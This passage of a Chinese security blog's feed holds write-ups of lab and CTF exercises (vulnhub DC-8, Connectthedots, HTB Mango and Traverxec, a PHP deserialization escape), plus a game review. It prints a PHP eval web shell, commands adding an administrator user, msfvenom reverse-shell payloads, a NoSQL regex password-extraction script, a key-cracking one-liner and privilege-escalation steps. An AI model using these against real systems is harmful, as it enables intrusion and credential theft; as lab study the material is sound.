index.php&lt;?phpeval($_REQUEST[cmd]);phpinfo();?&gt;</code></pre><p>(为了验证上传成功，多加个phpinfo())</p><p>自动上传，爆破得到文件名</p><p><img src="/posts/ea51772/1583828526162.png" alt></p><p>然后就是添加用户，将用户添加到用户组</p><pre><code>net user hacker Beijing123 /addnet localgroup administrators hacker /add</code></pre><p>看一下端口开放情况</p><p><img src="/posts/ea51772/1583828518473.png" alt></p><p>这里。。比较坑的就是远程桌面并不是3389，而是。。。35155</p><pre><code>rdesktop 192.168.1.4:35155</code></pre><p>连接之后即可，发现 <code>2.key</code> 文件，给它添加一个用户即可</p><p><img src="/posts/ea51772/1583828819591.png" alt></p><p>太卡了就不演示了</p><h2 id="ps-使用metasploit做法"><a href="#ps-使用metasploit做法" class="headerlink" title="ps 使用metasploit做法"></a>ps 使用metasploit做法</h2><p>一开始由于找不到图形界面，所以只能用命令行去刚。最后还是屈服了(GUI真香)</p><p>msfvenom生成php马</p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f raw  -o index.php</code></pre><p><img src="/posts/ea51772/1583829091269.png" alt="成功弹到shell"></p><p>然而美中不足的是权限不够，所以需要再生成一个Windows的木马反弹一次。。</p><p>重新开始监听，换一个payload</p><p><img src="/posts/ea51772/1583829313717.png" alt></p><p>msfvenom 生成shell.exe</p><pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f exe -o shell.exe</code></pre><p>传一下shell.exe</p><p><img src="/posts/ea51772/1583829335497.png" alt="1583829335497"></p><p>执行，成功反弹</p><p><img src="/posts/ea51772/1583829371796.png" alt></p><p>当然这样也能获得管理员权限，但是还是没法读文件</p><p><img src="/posts/ea51772/1583829406417.png" alt></p><p>也就是记录一下msf的强大</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化导致字符的逃逸</title>
      <link href="/posts/bdd52bdc/"/>
      <url>/posts/bdd52bdc/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>PHP 在反序列化时，<strong>对类中不存在的属性也会进行反序列化</strong></p><p>这个点很神奇，</p><h2 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h2><pre><code class="php">&lt;?phpfunction filter($string){    return preg_match(&#39;/x/&#39;,&#39;yy&#39;,$string);}$username = &quot;peri0d&quot;;$password = &quot;aaaaa&quot;;$user = array($username, $password);var_dump(serialize($user));echo &#39;\n&#39;;$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>这里将 <code>x</code> 替换为 <code>yy</code>,也就是变长了，正常的序列化数据为</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>如果我们可以控制用户名去修改密码，那么应该是这样的</p><pre><code>a:2:{i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}</code></pre><p>(尤其注意这里的双引号)</p><p><code>peri0d</code> 长度为6，<code>&quot;;i:1;s:6:&quot;123456&quot;;}</code> 长度为20</p><p>x替换为yy，长度由原来的1变为2，那么我们这里设填充为z,满足</p><p>6+20+z = 6+2z，得到的z就是20，所以填充x为20即可</p><pre><code class="php">$username = &quot;peri0d&quot;;$payload = &#39;&quot;;i:1;s:6:&quot;123456&quot;;}&#39;;$x = str_repeat(&quot;x&quot;,20);$username = $username.$x.$payload;$password = &quot;aaaaa&quot;;$user = array($username, $password);$r = filter(serialize($user));var_dump($r);echo &#39;\n&#39;;var_dump(unserialize($r));</code></pre><p>结果</p><pre><code>&quot;a:2:{i:0;s:46:&quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;}&quot;;i:1;s:5:&quot;aaaaa&quot;;}&quot;array(2) {  [0] =&gt;  string(46) &quot;peri0dyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;  [1] =&gt;  string(6) &quot;123456&quot;}</code></pre><h2 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h2><p>安洵杯 easy_serialize_php</p><p>代码如下</p><pre><code class="php"> &lt;?php$function = @$_GET[&#39;f&#39;];function filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}if($_SESSION){    unset($_SESSION);}$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function){    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;}if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;){    highlight_file(&#39;index.php&#39;);}else if($function == &#39;phpinfo&#39;){    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!}else if($function == &#39;show_image&#39;){    $userinfo = unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));} </code></pre><p>flag 在 <code>d0g3_f1ag.php</code> 这个文件中</p><p><code>$_SESSION</code> 数组中有 <code>user, funciton, img</code> 这三个属性</p><p>最后读文件的文件名是 <code>$_SESSION[&#39;img&#39;]</code> ，如果能够控制这个属性就好了，但是</p><pre><code class="php">if(!$_GET[&#39;img_path&#39;]){    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);}else{    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));}</code></pre><p>显然 <code>sha1</code> 的数据你是没法控制的，那怎么搞呢</p><p>重点在这里</p><pre><code class="php">$serialize_info = filter(serialize($_SESSION));</code></pre><p>序列化之后经过了一次过滤</p><p>而 <code>extract($_POST);</code> 使得我们可以控制 <code>$_SESSION</code> 数组中的 <code>user</code> 和 <code>function</code></p><p>先测试一下正常的一段序列化字符：</p><pre><code>a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>能不能控制好user和function，使得加上一个我们控制好的img</p><pre><code>a:3:{s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:4:&quot;2333&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;};s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>这样反序列化的时候最后的那个 img属性就是多余的了，我们来计算一下怎么利用过滤来达到目的</p><pre><code class="php">&lt;?phpfunction filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}$_SESSION[&#39;user&#39;] = &#39;2333&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;$a = filter(serialize($_SESSION));var_dump(filter(serialize($_SESSION)));// var_dump(unserialize($a));</code></pre><p>此时生成的是</p><pre><code>a:3:{s:4:&quot;user&quot;;s:4:&quot;2333&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>我们要让 <code>&quot;;s:8:&quot;function&quot;;s:61:&quot;a</code> 这段字符被吃掉，成为 <code>user</code> 的值，算一下长度24，正好是6个flag</p><p>所以</p><pre><code class="php">&lt;?phpfunction filter($img){    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;    return preg_replace($filter,&#39;&#39;,$img);}$_SESSION[&#39;user&#39;] = &#39;flagflagflagflagflagflag&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;$a = filter(serialize($_SESSION));var_dump(filter(serialize($_SESSION)));var_dump(unserialize($a));</code></pre><p>这时候得到的结果</p><pre><code class="php">a:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:2:&quot;dd&quot;;s:3:&quot;aaa&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZwo=&quot;;}</code></pre><p>再进行反序列化</p><pre><code>array(3) {  &#39;user&#39; =&gt;  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;  &#39;img&#39; =&gt;  string(20) &quot;ZDBnM19mMWFnLnBocAo=&quot;  &#39;dd&#39; =&gt;  string(3) &quot;aaa&quot;}</code></pre><p>可以看到成功地覆盖了img属性</p><p>ps,又测试了一下如果有两个img属性会怎么搞</p><pre><code class="php">$_SESSION[&#39;user&#39;] = &#39;flagflagflagflagflagflag&#39;;$_SESSION[&#39;function&#39;] = &#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocAo=&quot;;s:3:&quot;img&quot;;s:3:&quot;aaa&quot;;}&#39;;$_SESSION[&#39;img&#39;] = &#39;Z3Vlc3RfaW1nLnBuZwo=&#39;;</code></pre><p>得到的结果是：</p><pre><code class="php">array(2) {  &#39;user&#39; =&gt;  string(24) &quot;&quot;;s:8:&quot;function&quot;;s:62:&quot;a&quot;  &#39;img&#39; =&gt;  string(3) &quot;aaa&quot;}</code></pre><p>此时img属性被合并了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文明六玩后感</title>
      <link href="/posts/61b7ba22/"/>
      <url>/posts/61b7ba22/</url>
      
        <content type="html"><![CDATA[<p>完了一段的时间的文明六，（虽然才48个小时</p><p><img src="/posts/61b7ba22/1583294758274.png" alt></p><h2 id="总体感觉"><a href="#总体感觉" class="headerlink" title="总体感觉"></a>总体感觉</h2><p>一开始玩这个游戏有点不知所措，因为这个游戏的信息量实在是太大了，后来慢慢地从别人的视频中才逐渐的熟悉起来。</p><p>文明六大概分为几个部分吧，首先是最基本的城市，可以建造区域，练兵，造工人，开拓者。然后是</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-DC-8</title>
      <link href="/posts/24a0544e/"/>
      <url>/posts/24a0544e/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap扫描结果</p><pre><code>PORT   STATE SERVICE  VERSION22/tcp open  ssh      OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)| ssh-hostkey: |   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)80/tcp open  ssl/http Apache|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache|_http-title: Welcome to DC-8 | DC-8MAC Address: 08:00:27:A8:B6:73 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>打开80端口发现是drupal,扫描到后台 <a href="http://192.168.56.102/user" target="_blank" rel="noopener">http://192.168.56.102/user</a> ，并且发现了可疑注入点</p><p><img src="/posts/24a0544e/1583216887452.png" alt></p><p>sqlmap注入</p><p><img src="/posts/24a0544e/1583217015158.png" alt></p><p>得到用户名和密码</p><pre><code>+-------+---------------------------------------------------------+| name  | pass                                                    |+-------+---------------------------------------------------------+| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z || john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |+-------+---------------------------------------------------------+</code></pre><p>不过密码是hash过的，使用john爆破，只有 <code>john</code> 用户的密码可以爆破出来 <code>turtle</code></p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>修改页面</p><p><img src="/posts/24a0544e/1583217110935.png" alt></p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f raw  -o shell.php</code></pre><p>生成 shell ，修改</p><p><img src="/posts/24a0544e/1583217170125.png" alt></p><p>修改完之后，提交表单</p><p><img src="/posts/24a0544e/1583217222343.png" alt></p><p>成功getshell</p><p><img src="/posts/24a0544e/1583217261982.png" alt></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>寻找 SUID</p><pre><code>www-data@dc-8:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null                     /usr/bin/chfn                                             /usr/bin/gpasswd                                          /usr/bin/chsh                                             /usr/bin/passwd                                           /usr/bin/sudo                                             /usr/bin/newgrp                                           /usr/sbin/exim4                                           /usr/lib/openssh/ssh-keysign                              /usr/lib/eject/dmcrypt-get-device                         /usr/lib/dbus-1.0/dbus-daemon-launch-helper               /bin/ping                                                 /bin/su                                                   /bin/umount                                               /bin/mount                                                </code></pre><p>发现了 <code>exim4</code> ,这是一个邮件程序</p><p>搜索相关的 exploit</p><p><img src="/posts/24a0544e/1583217430342.png" alt></p><p>将 <code>46996.sh</code> 上传到靶机上，注意需要修改一下文件格式为 <code>unix</code></p><pre><code>set ff=unix</code></pre><p><img src="/posts/24a0544e/1583217742979.png" alt></p><p>最后得到flag</p><p><img src="/posts/24a0544e/1583217755873.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB mango靶机实战</title>
      <link href="/posts/73230382/"/>
      <url>/posts/73230382/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22端口，80端口，443端口</p><p><img src="/posts/73230382/1582967083509.png" alt></p><p>这里改一下host</p><pre><code>staging-order.mango.htb</code></pre><p>访问网站</p><p><img src="/posts/73230382/1582967236329.png" alt></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>有点坑，是mongodb，nosql注入</p><p><img src="/posts/73230382/1582967256341.png" alt></p><p>参考爆破脚本</p><pre><code class="python">#!/usr/bin/env python  import requests  import string  url = &quot;http://staging-order.mango.htb/index.php&quot;  headers = {&quot;Host&quot;: &quot;staging-order.mango.htb&quot;}  cookies = {&quot;PHPSESSID&quot;: &quot;9k6j39np56td4vq3q4lg4eh95j&quot;}  possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\&quot;+c for c in string.punctuation+string.whitespace ]  def get_password(username):      print(&quot;Extracting password of &quot; + username)      params = {&quot;username&quot;:username, &quot;password[$regex]&quot;:&quot;&quot;, &quot;login&quot;: &quot;login&quot;}      password = &quot;^&quot;      while True:          for c in possible_chars:              params[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot;              pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)              if int(pr.status_code) == 302:                  password += c                  break          if c == possible_chars[-1]:              print (&quot;Found password &quot;+password[1:].replace(&quot;\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)              return password[1:].replace(&quot;\\&quot;, &quot;&quot;)  def get_usernames():      usernames = []      params = {&quot;username[$regex]&quot;:&quot;&quot;, &quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;: &quot;login&quot;}      for c in possible_chars:          username = &quot;^&quot; + c          params[&quot;username[$regex]&quot;] = username + &quot;.*&quot;          pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)          if int(pr.status_code) == 302:              print(&quot;Found username starting with &quot;+c)              while True:                  for c2 in possible_chars:                      params[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot;                      if int(requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False).status_code) == 302:                          username += c2                          print(username)                          break                  if c2 == possible_chars[-1]:                      print(&quot;Found username: &quot; +username[1:])                      usernames.append(username[1:])                      break      return usernames  for u in get_usernames():      get_password(u)  </code></pre><p>爆出密码</p><p><img src="/posts/73230382/1582967279320.png" alt></p><pre><code>Found username: mangoExtracting password of adminFound password t9KcS3&gt;!0B#2 for username adminExtracting password of mangoFound password h3mXK8RhU~f{]f5H for username mango</code></pre><p>使用mango用户登陆</p><p><img src="/posts/73230382/1582967292499.png" alt></p><p>切换为admin</p><p><img src="/posts/73230382/1582967301413.png" alt></p><pre><code>userflag$ cat user.txt79bf31c6c6eb38a8567832f7f8b47e92</code></pre><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><code>sudo -l</code> 试一下</p><p><img src="/posts/73230382/1582967336806.png" alt></p><pre><code>find / -user root -perm -4000 2&gt;/dev/null</code></pre><p>寻找SUID</p><p><img src="/posts/73230382/1582967364061.png" alt></p><p>根据<a href="https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt</a></p><p><img src="/posts/73230382/1582967372531.png" alt></p><pre><code class="bash">Warning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);jjs&gt; var FileReader = Java.type(&quot;java.io.FIleReader&quot;);java.lang.RuntimeException: java.lang.ClassNotFoundException: java.io.FIleReaderjjs&gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);jjs&gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));jjs&gt; while((line=br.readline())!=null){print(line);}&lt;shell&gt;:1 TypeError: br.readline is not a functionjjs&gt; while((line=br.readLine())!=null){print(line);}8a8ef79a7a2fbb01ea81688424e9ab15</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Traverxec靶机实战</title>
      <link href="/posts/d5bfc2a3/"/>
      <url>/posts/d5bfc2a3/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22号端口和80号端口</p><p><img src="/posts/d5bfc2a3/1582966595850.png" alt></p><p>看到http的信息是 <code>nostromo</code>,msf搜索exploit直接打</p><p><img src="/posts/d5bfc2a3/1582966633536.png" alt="成功得到meterpreter"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>由于是 <code>nostromo</code> 搭建的，根目录 在 <code>/var/nostromo</code> </p><p><img src="/posts/d5bfc2a3/1582966671887.png" alt></p><p>查找conf目录</p><p><img src="/posts/d5bfc2a3/1582966693102.png" alt></p><p>查看配置文件 <code>nhttpd.conf</code></p><p><img src="/posts/d5bfc2a3/1582966726837.png" alt></p><p>发现根目录是在 public_www 下<br>是在家目录下，这个权限配置很有意思，你只能进去却看不到</p><p><img src="/posts/d5bfc2a3/1582966745190.png" alt></p><p>下载压缩包下来 <code>/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</code></p><p>解压之后就得到了私钥，但是尝试登陆还是需要密码</p><p><img src="/posts/d5bfc2a3/1582966789646.png" alt></p><p>这里就需要爆破了</p><p>可以使用john，首先需要 <code>python ssh2john.py id_rsa &gt; rsacrack</code> 转一下。但是这种方式太慢了，换一种，折耳根payload记一下</p><pre><code>cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;david@10.10.10.165&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</code></pre><p><img src="/posts/d5bfc2a3/1582966833790.png" alt></p><p>然后登陆 密码是 hunter</p><p><img src="/posts/d5bfc2a3/1582966848699.png" alt></p><pre><code>david@traverxec:~$ cat user.txt7db0b48469606a42cec20750d9782f3d</code></pre><p>得到flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看到一个文件</p><pre><code class="bash">david@traverxec:~/bin$ cat server-stats.head                                                                                                                     .----.                                                                     .---------. | == |          Webserver Statistics and Data                              |.-&quot;&quot;&quot;&quot;&quot;-.| |----|                Collection Script                                    ||       || | == |                 (c) David, 2019                                     ||       || |----|                                                                     |&#39;-.....-&#39;| |::::|                                                                     &#39;&quot;&quot;)---(&quot;&quot;&#39; |___.|                                                                    /:::::::::::\&quot;    &quot;                                                                   /:::=======:::\                                                                    jgs &#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#39;            david@traverxec:~/bin$ cat server-stats.sh                                             #!/bin/bash                                                                            cat /home/david/bin/server-stats.head                                                  echo &quot;Load: `/usr/bin/uptime`&quot;                                                         echo &quot; &quot;                                                                               echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;               echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;    echo &quot; &quot;                                                                               echo &quot;Last 5 journal log lines:&quot;                                                       /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat                </code></pre><p>发现 <code>journalctl</code> 是用sudo执行的</p><p>提权： <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p><pre><code># cat root.txt9aa36a6d76f785dfd320a478f6e0d906</code></pre><p><img src="/posts/d5bfc2a3/1582966978146.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体下来感觉还行，还是要扩大知识面</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-最长回文字串</title>
      <link href="/posts/a99288c/"/>
      <url>/posts/a99288c/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-Connectthedots</title>
      <link href="/posts/e4ff8385/"/>
      <url>/posts/e4ff8385/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶机渗透-Connectthedots"><a href="#vulnhub靶机渗透-Connectthedots" class="headerlink" title="vulnhub靶机渗透-Connectthedots"></a>vulnhub靶机渗透-Connectthedots</h1><p>目标：/home/user.txt and /root/root.txt</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>由于VMware会出现种种问题，于是改成了Virtual Box,而且Vulhub上的大部分靶机都是使用Virtual Box制作的</p><p>附上一些相关的配置截图：</p><p>kali 2019.04<br>第一块网卡没做修改</p><p>添加了第二块网卡<br><img src="/posts/e4ff8385/1576475770757.png" alt></p><p>vulnhub靶机渗透-Connectthedots作为靶机，同样添加了第二块网卡</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>kali IP ： 192.168.99.101<br><img src="/posts/e4ff8385/1576475827530.png" alt></p><p>通过nmap发现另一台主机(注意netdiscover和arp-scan都无法使用了)<br><img src="/posts/e4ff8385/1576475870118.png" alt></p><p>主机开放的所有服务：</p><p><img src="/posts/e4ff8385/1576476412907.png" alt></p><p>一个个来看</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>vsftp 服务， metasploit搜索payload</p><p>返回的信息：</p><pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit [*] 192.168.99.104:21 - Banner: 220 Welcome to Heaven![*] 192.168.99.104:21 - USER: 530 Permission denied.[-] 192.168.99.104:21 - This server is configured for anonymous only and the backdoor code cannot be reached[*] Exploit completed, but no session was created.</code></pre><p>尝试匿名登陆没有成功</p><p><img src="/posts/e4ff8385/1576476598073.png" alt></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>目录遍历：</p><p><img src="/posts/e4ff8385/1575977787813.png" alt><br>扫描结果有两个index页面，查看其中一个发现：</p><p>发现了注释</p><p><img src="/posts/e4ff8385/1575977822127.png" alt></p><p>访问发现是一个登陆页面，发现这个登陆页面并不会有数据包，是个静态页面</p><p><img src="/posts/e4ff8385/1576476010899.png" alt></p><p>然后访问 <code>/mysite</code><br><img src="/posts/e4ff8385/1575977851454.png" alt></p><p>查看文件后发现<br><img src="/posts/e4ff8385/1575977868784.png" alt></p><p>是jsfuck编码</p><p>jsfuck解码网站 <a href="http://www.jsfuck.com/#" target="_blank" rel="noopener">http://www.jsfuck.com/#</a></p><p>也可以直接用浏览器的控制台解码</p><p>可以将其复制到浏览器的控制台：<br>然后输入：<br><img src="/posts/e4ff8385/1575977938119.png" alt></p><p>这样可以免去手动复制粘贴的麻烦</p><p>得到结果：<br><img src="/posts/e4ff8385/1575977956725.png" alt></p><pre><code>You&#39;re smart enough to understand me. Here&#39;s your secret, TryToGuessThisNorris@2k19</code></pre><p>得到了secret，猜测是ssh登陆的口令</p><h2 id="2049端口"><a href="#2049端口" class="headerlink" title="2049端口"></a>2049端口</h2><p>开放了NFS服务</p><p>使用nmap或者metasploit探测可以挂载的目录，</p><pre><code>msf5 auxiliary(scanner/nfs/nfsmount) &gt; exploit [+] 192.168.99.104:111    - 192.168.99.104 NFS Export: /home/morris [*][*] 192.168.99.104:111    - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>获得挂载目录 <code>/home/morris</code></p><p>安装nfspysh:</p><p><code>git clone https://github.com/bonsaiviking/NfSpy.git</code></p><h2 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h2><p>nmap没有扫除ssh开放的端口，因为这台靶机的ssh并不是开放在通常的22号端口上</p><p>通过扫描确认：<br><img src="/posts/e4ff8385/1576476969297.png" alt></p><p>ssh开放的端口是7822</p><p>尝试用之前得到的口令去登陆，用户名是<code>morris</code><br>登陆失败</p><p>从80端口的<code>index.html</code>知道，M和N的命名规则，尝试修改用户名为<code>norris</code><br><img src="/posts/e4ff8385/1576477106793.png" alt></p><p>登陆成功！<br>得到<code>user.txt</code>的内容</p><p><img src="/posts/e4ff8385/1576477362762.png" alt><br>之后去<code>/var/www/html</code>目录下查看文件</p><p>发现了<code>.secretfile.swp</code>文件<br>直接查看提示权限不够，于是想到从网页下载</p><p>可以看到<code>.secretfile.swp</code>文件的权限被设置为只有<code>www-data</code>用户才能读写</p><p><img src="/posts/e4ff8385/1576479512154.png" alt></p><p>通过<code>vim -r secretfile.swp</code>得到源文件内容</p><pre><code>I see you&#39;re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..blehguessme090</code></pre><p>于是成功登陆morris用户<br><img src="/posts/e4ff8385/1576477489908-1581332150635.png" alt></p><h2 id="最后的“提权”"><a href="#最后的“提权”" class="headerlink" title="最后的“提权”"></a>最后的“提权”</h2><p>登陆了morris用户之后，还是无法进入到root的目录下查看文件</p><p>先上一个<code>LinEnum.sh</code>提权辅助脚本，但是并未发现有意思的东西</p><p>又去找到了另外一个脚本 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh" target="_blank" 